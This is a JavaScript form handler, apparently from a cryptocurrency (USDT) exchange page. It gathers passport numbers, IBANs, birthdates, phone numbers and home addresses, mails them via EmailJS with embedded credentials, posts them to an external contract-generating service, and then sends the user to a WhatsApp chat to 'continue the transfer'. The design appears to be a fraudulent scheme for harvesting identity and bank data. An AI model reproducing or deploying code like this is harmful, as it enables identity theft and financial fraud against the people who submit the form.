
document.getElementById('exchangeForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const form = e.target;
  const name = form.name.value;
  const passport = form.passport.value;
  const email = form.email.value;
  const iban = form.iban.value;
  const amount = form.amount.value;
  const phone = form.phone.value;
  const birthdate = form.birthdate.value;
  const street = form.street.value;
  const city = form.city.value;
  const zip = form.zip.value;
  const province = form.province.value;
  const country = form.country.value;

  const templateParams = {
    name,
    passport,
    email,
    iban,
    amount,
    phone,
    birthdate,
    street,
    city,
    zip,
    province,
    country
  };

  emailjs.init('E12iyom7-49KmyGud');
  const serviceID = 'service_2mxuxfg';
  const templateID = 'template_4wt295m';

  emailjs.send(serviceID, templateID, templateParams)
    .then(() => console.log("Email отправлен"))
    .catch((error) => {
      console.error("EmailJS ошибка:", error);
      alert("Ошибка при отправке email. Попробуйте ещё раз.");
    });

  try {
    const response = await fetch("https://usdt-docs.railway.app/generate", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(templateParams)
    });

    if (!response.ok) throw new Error("Ошибка генерации договора");

    const blob = await response.blob();
    const url = URL.createObjectURL(blob);
    const downloadLink = document.getElementById("downloadLink");
    downloadLink.href = url;
    downloadLink.download = "contract.docx";

    const waText = encodeURIComponent("Здравствуйте! Я отправил форму и готов продолжить перевод.");
    document.getElementById("whatsappLink").href = `https://wa.me/34653500599?text=${waText}`;
    document.getElementById("result").style.display = "block";
  } catch (error) {
    console.error("Ошибка генерации документа:", error);
    alert("Не удалось сгенерировать договор. Попробуйте позже.");
  }
});
